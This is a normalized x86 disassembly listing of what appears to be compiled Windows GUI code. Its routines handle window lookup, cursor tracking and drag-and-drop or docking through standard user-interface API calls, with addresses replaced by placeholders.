je r-xdata
push ebp
mov eax [ ebp - 0x18 ]
call sub_43a894
pop ecx
test al al
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_413f44
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x10 ]
je r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
call sub_443708
push eax
call IsWindowVisible
test eax eax
je r-xdata
push ebp
call sub_43aa2c
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xa0 ]
cmp eax [ ebp - 0x14 ]
jne r-xdata
mov [ ebp - 0x1 ] 0x1
lea eax [ ebp - 0x9 ]
push eax
lea eax [ ebp - 0x1 ]
push eax
lea ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x14 ]
mov si 0xffbd
call sub_403454
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_442238
dec eax
jle r-xdata
push [ ebp - 0x5 ]
push [ ebp - 0x9 ]
lea eax [ ebp - 0x28 ]
push eax
call PtInRect
test eax eax
je r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_43a1f8
sub_43abcc
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
jne r-xdata
mov edi esi
mov edx edi
mov eax [ rw-data ]
call sub_413fa0
test bl bl
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
inc eax
jne r-xdata
mov edx eax
mov eax [ rw-data ]
call sub_413e34
mov edx edi
mov eax [ rw-data ]
call sub_413de8
jmp r-xdata
sub_43ac2c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] ecx
xor ecx ecx
test eax eax
je r-xdata
mov eax ecx
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx ]
mov [ ebp - 0x18 ] ebx
mov ebx [ ecx + 0x4 ]
mov [ ebp - 0x14 ] ebx
mov ecx [ ebp + 0xc ]
mov [ ebp - 0xc ] ecx
mov ecx [ ebp - 0x4 ]
mov [ ebp - 0x10 ] ecx
cmp [ rw-data ] 0x2
sete cl
mov [ ebp - 0x8 ] cl
lea ecx [ ebp - 0x18 ]
push ecx
and edx 0x7f
push edx
push 0xb02f
push eax
call SendMessageA
mov ecx eax
sub_43ac84
push ebx
push esi
push ecx
mov esi eax
xor ebx ebx
test esi esi
je r-xdata
mov eax ebx
pop edx
pop esi
pop ebx
retn
push esp
push esi
call GetWindowThreadProcessId
test eax eax
je r-xdata
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_404468
push eax
call GlobalFindAtomA
cmp ax [ rw-data ]
jne r-xdata
mov eax esi
call sub_439d78
test eax eax
setne bl
movzx eax [ rw-data ]
push eax
push esi
call GetPropA
test eax eax
setne bl
jmp r-xdata
sub_43ace4
push ebx
push [ eax + 0x4 ]
push [ eax ]
call WindowFromPoint
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_43ac84
test al al
jne r-xdata
push ebx
call GetParent
mov ebx eax
test ebx ebx
jne r-xdata
sub_43ad10
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
test cl cl
jne r-xdata
mov eax ebx
mov edx [ ebp + 0x8 ]
call sub_43aa70
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
call sub_43ace4
mov [ esi ] eax
push 0x0
push ebx
mov eax [ esi ]
mov ecx [ rw-data ]
mov dl 0x5
call sub_43ac2c
mov ebx eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn 0x4
mov eax ebx
call sub_443708
mov [ esi ] eax
sub_43ad60
push ebx
push esi
mov ebx eax
xor eax eax
mov edx [ rw-data ]
mov esi [ edx + 0x4 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
push esi
mov eax [ rw-data ]
add eax 0xc
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x8 ]
mov ecx [ rw-data ]
mov edx ebx
call sub_43ac2c
cmp eax 0x1
sbb eax eax
inc eax
sub_43ad9c
push ebx
push esi
push edi
xor edi edi
mov eax [ rw-data ]
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x1a7 ] 0x0
je r-xdata
cmp [ esi + 0x178 ] 0x0
je r-xdata
mov eax esi
call sub_4421a4
test eax eax
je r-xdata
mov eax esi
call sub_4421a4
dec eax
jne r-xdata
mov eax [ rw-data ]
add eax 0xc
xor edx edx
call sub_43b7cc
mov ebx eax
jmp r-xdata
xor edx edx
mov eax [ esi + 0x178 ]
call sub_413f44
mov edx [ rw-data ]
cmp eax [ edx + 0x38 ]
je r-xdata
test ebx ebx
je r-xdata
cmp esi ebx
jne r-xdata
mov edx ebx
mov eax [ esi + 0x178 ]
call sub_413fa0
cmp eax 0xffffffff
je r-xdata
mov ebx [ ebx + 0x30 ]
mov edx eax
mov eax esi
call sub_4421b8
mov edi eax
jmp r-xdata
sub_43ae30
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
mov cl [ eax + 0x9b ]
lea edx [ esp + 0x4 ]
mov eax edi
call sub_43ad10
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
sub eax [ edi ]
cdq
xor eax edx
sub eax edx
cmp eax [ rw-data ]
jge r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x9b ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
sub eax [ edi + 0x4 ]
cdq
xor eax edx
sub eax edx
cmp eax [ rw-data ]
jl r-xdata
cmp [ rw-data ] 0x0
setne [ esp + 0x4 ]
mov [ rw-data ] 0x2
mov [ rw-data ] 0x1
mov [ esp + 0x4 ] 0x0
jmp r-xdata
mov eax [ rw-data ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ rw-data ]
mov eax [ rw-data ]
call sub_44520c
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov edx [ edi ]
mov [ eax + 0xc ] edx
mov edx [ edi + 0x4 ]
mov [ eax + 0x10 ] edx
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov al 0x1
call sub_43ad60
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x4 ]
je r-xdata
mov eax [ edi + 0x4 ]
push eax
mov al 0x2
call sub_43ad60
mov edx eax
mov ecx [ edi ]
mov eax [ rw-data ]
mov esi [ eax ]
call [ esi + 0x4 ]
mov esi eax
cmp [ rw-data ] 0x0
je r-xdata
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
call sub_43ca64
mov eax [ rw-data ]
mov edx [ esp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ esp + 0xc ]
mov [ eax + 0x18 ] edx
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov eax [ rw-data ]
mov edx [ esp ]
mov [ eax + 0x8 ] edx
mov eax [ rw-data ]
mov edx [ edi ]
mov [ eax + 0xc ] edx
mov edx [ edi + 0x4 ]
mov [ eax + 0x10 ] edx
xor eax eax
call sub_43ad60
cmp [ rw-data ] 0x0
je r-xdata
movsx edx si
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45abb8
push eax
call SetCursor
cmp [ rw-data ] 0x2
jne r-xdata
test ebx ebx
je r-xdata
test ebx ebx
jne r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_4451c8
mov eax [ rw-data ]
cmp [ eax + 0x6a ] 0x0
jne r-xdata
test [ ebx + 0x51 ] 0x20
je r-xdata
call sub_43ad9c
mov ebx eax
mov eax [ rw-data ]
mov [ eax + 0x58 ] ebx
test ebx ebx
jne r-xdata
mov edx [ edi + 0x4 ]
push edx
mov ecx [ edi ]
mov eax [ rw-data ]
mov edx [ eax + 0x38 ]
xchg edx eax
mov si 0xffe7
call sub_403454
jmp r-xdata
mov ecx [ edi + 0x4 ]
mov edx [ edi ]
mov eax [ rw-data ]
call sub_4452f4
jmp r-xdata
mov eax [ edi + 0x4 ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ edi ]
mov eax [ rw-data ]
call sub_44520c
jmp r-xdata
mov eax [ rw-data ]
call sub_445368
movsx edx si
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45abb8
push eax
call SetCursor
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax ebx
call sub_43ca64
lea edx [ esp + 0x8 ]
mov eax ebx
mov si 0xffd8
call sub_403454
mov edx [ rw-data ]
mov [ edx + 0x54 ] al
mov eax [ rw-data ]
lea edx [ eax + 0x14 ]
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov si 0xffd8
call sub_403454
mov edx [ rw-data ]
mov [ edx + 0x54 ] al
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ rw-data ]
lea edx [ ebx + 0x5c ]
lea eax [ ebx + 0x44 ]
mov ecx 0x10
call sub_407ca8
test al al
jne r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ rw-data ]
lea esi [ eax + 0x44 ]
lea edi [ eax + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x34 ]
sub_43b100
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov ebx edx
mov esi eax
mov [ rw-data ] esi
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x4 ] edx
push rw-data
call GetCursorPos
mov eax [ rw-data ]
mov edx [ rw-data ]
mov [ eax + 0xc ] edx
mov edx [ rw-data ]
mov [ eax + 0x10 ] edx
call GetCursor
mov [ rw-data ] eax
mov eax [ rw-data ]
call sub_43a32c
mov [ rw-data ] eax
mov [ rw-data ] edi
mov eax esi
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
test bl bl
je r-xdata
mov edx esi
lea eax [ edx + 0x44 ]
mov edi [ eax + 0x8 ]
mov ecx [ eax ]
sub edi ecx
test edi edi
jle r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x1
jmp r-xdata
xor ecx ecx
mov [ edx + 0x20 ] ecx
mov [ edx + 0x24 ] ecx
mov edi [ edx + 0xc ]
sub edi ecx
mov [ esp ] edi
fild [ esp ]
mov ecx [ eax + 0x8 ]
sub ecx [ eax ]
mov [ esp + 0x4 ] ecx
fild [ esp + 0x4 ]
fdivp st1
fstp [ edx + 0x20 ]
fwait
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ rw-data ]
mov eax [ rw-data ]
call sub_44520c
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ esi + 0x28 ] eax
mov [ esi + 0x2c ] eax
mov ecx esi
mov edi [ ecx + 0x10 ]
sub edi edx
mov [ esp ] edi
fild [ esp ]
mov edx [ eax + 0xc ]
sub edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
fild [ esp + 0x4 ]
fdivp st1
fstp [ ecx + 0x28 ]
fwait
jmp r-xdata
mov ecx [ eax + 0xc ]
mov edx [ eax + 0x4 ]
sub ecx edx
test ecx ecx
jle r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax rw-data
call sub_43ae30
mov [ rw-data ] 0x0
jmp r-xdata
mov [ rw-data ] 0x2
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
jmp r-xdata
test bl bl
je r-xdata
sub_43b270
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov edi eax
mov [ rw-data ] edi
xor edx edx
push ebp
push j_sub_4036f8#9
push [ fs : edx ]
mov [ fs : edx ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x0
cmp [ edi + 0x9b ] 0x0
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
mov si 0xffe3
call sub_403454
cmp [ rw-data ] 0x0
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
mov si 0xffdc
call sub_403454
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esi [ eax + 0x38 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_43a634
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_43b100
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_43a51c
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esi [ eax + 0x38 ]
cmp [ esi + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x44
push eax
mov eax esi
call sub_443708
push eax
call GetWindowRect
jmp r-xdata
lea ecx [ ebp - 0x20 ]
xor edx edx
xor eax eax
call sub_412ae8
lea edx [ ebp - 0x20 ]
lea ecx [ ebp - 0x18 ]
mov eax esi
call sub_43ca38
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x44 ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x48 ] edx
mov eax esi
mov edx [ r-xdata ]
call sub_4033e4
test al al
jne r-xdata
mov eax [ ebp - 0x8 ]
lea esi [ eax + 0x44 ]
lea edi [ eax + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x10 ]
push eax
call GetCursorPos
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x44 ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x48 ] edx
jmp r-xdata
mov esi [ ebp - 0x8 ]
mov edx [ esi + 0x48 ]
mov eax [ ebp - 0x8 ]
mov edi [ eax + 0x38 ]
add edx [ edi + 0x4c ]
mov eax [ esi + 0x44 ]
add eax [ edi + 0x48 ]
lea ecx [ ebp - 0x18 ]
call sub_412ae8
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x4c ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x50 ] edx
sub_43b434
push ebp
mov ebp esp
push ebx
push esi
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
setne bl
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
mov bl 0x1
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0xa0 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0xa0 ]
test eax eax
je r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x4 ]
mov ecx [ rw-data ]
mov si 0xffbe
call sub_403454
mov ebx eax
sub_43b4a8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x1 ] al
xor ebx ebx
mov [ ebp - 0x2 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_43b774
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov [ rw-data ] eax
xor edx edx
push ebp
push sub_43b702
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov [ eax + 0x30 ] 0x1
mov eax [ rw-data ]
mov dl [ ebp - 0x1 ]
mov [ eax + 0x1c ] dl
mov edx [ rw-data ]
mov eax [ rw-data ]
call sub_43a374
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_403408
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
cmp [ ebx + 0x4 ] 0x0
sete al
mov [ ebx + 0x6c ] al
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
mov [ ebp - 0xa ] edx
mov edx [ eax + 0x10 ]
mov [ ebp - 0x6 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
xor eax eax
jmp r-xdata
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov edx [ eax + 0x14 ]
mov [ ebp - 0xa ] edx
mov edx [ eax + 0x18 ]
mov [ ebp - 0x6 ] edx
jmp r-xdata
mov [ ebp - 0x2 ] al
cmp [ rw-data ] 0x2
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
push ebp
call sub_43b434
pop ecx
test al al
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebp - 0x2 ] 0x0
je r-xdata
mov al 0x1
call sub_43ad60
test al al
je r-xdata
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
call SetCursor
mov eax [ rw-data ]
call sub_445368
jmp r-xdata
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43b709
mov eax [ rw-data ]
call sub_403258
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x38 ]
call sub_453eac
test eax eax
je r-xdata
xor eax eax
mov [ rw-data ] eax
retn
mov eax [ rw-data ]
mov [ eax + 0x30 ] 0x0
mov eax [ ebp - 0x6 ]
push eax
mov al [ ebp - 0x2 ]
push eax
mov eax [ rw-data ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0xa ]
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx ]
mov al 0x3
cmp [ ebp - 0x2 ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
xor ecx ecx
mov edx 0xb03a
mov eax [ rw-data ]
call sub_43e0d4
jmp r-xdata
mov edx [ eax + 0x220 ]
cmp edx [ ebx + 0x38 ]
jne r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x4 ]
push edx
mov edx [ rw-data ]
add edx 0xc
push edx
mov edx [ rw-data ]
mov edx [ edx + 0x8 ]
mov ecx [ rw-data ]
xchg edx eax
call sub_43ac2c
mov al 0x4
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + 0xc ] ecx
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + 0x10 ] ecx
xor edx edx
mov [ ebp - 0xa ] edx
xor edx edx
mov [ ebp - 0x6 ] edx
xor edx edx
call sub_457b18
sub_43b709
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x0
retn
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_4033e4
test al al
jne r-xdata
mov eax [ rw-data ]
call sub_403258
mov eax [ rw-data ]
mov edx [ rw-data ]
call sub_4033e4
test al al
jne r-xdata
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
sub_43b798
push ebx
push esi
push [ eax + 0x4 ]
push [ eax ]
call WindowFromPoint
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax ebx
call sub_439dac
mov esi eax
test esi esi
jne r-xdata
push ebx
call GetParent
mov ebx eax
test ebx ebx
jne r-xdata
sub_43b7cc
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov edi eax
xor esi esi
mov eax edi
call sub_43b798
mov ebp eax
test ebp ebp
je r-xdata
mov eax esi
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov esi ebp
push 0x0
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax ebp
call sub_43ca64
lea edx [ esp + 0x4 ]
mov ecx ebx
mov eax ebp
call sub_440ff4
test eax eax
je r-xdata
mov esi eax
sub_43b814
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
mov edx esi
call sub_413de8
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebx ] eax
sub_43b83c
push ebx
mov ebx eax
mov eax [ ebx ]
call sub_414088
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx ]
call sub_403258
xor eax eax
mov [ ebx ] eax
sub_43b85c
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
push esp
push ebx
call GetWindowOrgEx
push 0x0
mov eax [ esp + 0x8 ]
sub eax edi
push eax
mov eax [ esp + 0x8 ]
sub eax esi
push eax
push ebx
call SetWindowOrgEx
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_43b88c
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ rw-data ]
call sub_4142b0
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_43b93c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_414314
retn
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0xc ]
jne r-xdata
xor eax eax
push ebp
push sub_43b915
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
call sub_43bac8
call sub_403a90
call sub_403a90
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_413f44
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
call sub_41dbc8
test al al
je r-xdata
mov esp ebp
pop ebp
retn
sub_43b948
push ebp
mov ebp esp
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_4142b0
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_43b9e6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43b9ed
mov eax [ rw-data ]
call sub_414314
retn
mov [ ebp - 0x4 ] eax
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
push ebp
push sub_43b9be
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_43bac8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_41dc24
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_413f44
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_41dbc8
test al al
je r-xdata
sub_43b9f4
push ebx
push esi
call sub_4035e4
mov ebx edx
mov esi eax
mov eax esi
call sub_43bac8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41d7f8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035cc
sub_43ba20
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41dda8
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_41ddac
mov eax [ ebp - 0x4 ]
call sub_43bb14
mov eax [ rw-data ]
call sub_4142b0
mov ebx eax
xor eax eax
push ebp
push sub_43baa5
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x8 ] 0x4
jl r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x60 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5c ] eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_413de8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_414314
retn
call sub_43b88c
sub_43bac8
push ebx
mov ebx eax
cmp [ ebx + 0x5c ] 0x0
je r-xdata
pop ebx
retn
xor edx edx
mov eax ebx
call sub_41ddac
mov edx ebx
mov eax [ rw-data ]
call sub_4142c4
mov eax [ ebx + 0x5c ]
push eax
mov eax [ ebx + 0x60 ]
push eax
call ReleaseDC
xor eax eax
mov [ ebx + 0x5c ] eax
sub_43bb14
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x58 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_43d564
test al al
je r-xdata
and [ ebx + 0x54 ] 0xffffff7f
or [ ebx + 0x54 ] 0x80
jmp r-xdata
sub_43bb40
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403228
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40357c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
sub_43bb7c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_4145e4
pop esi
pop ebx
retn
mov eax ebx
mov edx [ esi + 0x10 ]
mov [ eax + 0x10 ] edx
mov edx [ esi + 0x8 ]
mov [ eax + 0x8 ] edx
mov edx [ esi + 0x14 ]
mov [ eax + 0x14 ] edx
mov edx [ esi + 0xc ]
mov [ eax + 0xc ] edx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_43bbc4
push esi
mov esi eax
sub edx 0x1
jb r-xdata
cmp ecx [ esi + 0x8 ]
je r-xdata
je r-xdata
pop esi
retn
mov [ esi + 0x8 ] ecx
test ecx ecx
jbe r-xdata
cmp ecx [ esi + 0xc ]
je r-xdata
dec edx
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0x10 ]
jae r-xdata
mov [ esi + 0xc ] ecx
test ecx ecx
jbe r-xdata
cmp ecx [ esi + 0x10 ]
je r-xdata
dec edx
je r-xdata
mov [ esi + 0x10 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0x14 ]
jae r-xdata
mov [ esi + 0x10 ] ecx
mov eax [ esi + 0x8 ]
test eax eax
jbe r-xdata
cmp ecx [ esi + 0x14 ]
je r-xdata
jmp r-xdata
mov [ esi + 0x14 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp eax ecx
jae r-xdata
mov [ esi + 0x14 ] ecx
mov eax [ esi + 0xc ]
test eax eax
jbe r-xdata
mov [ esi + 0x8 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
cmp eax ecx
jae r-xdata
mov [ esi + 0xc ] ecx
sub_43bc80
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x1c ] ecx
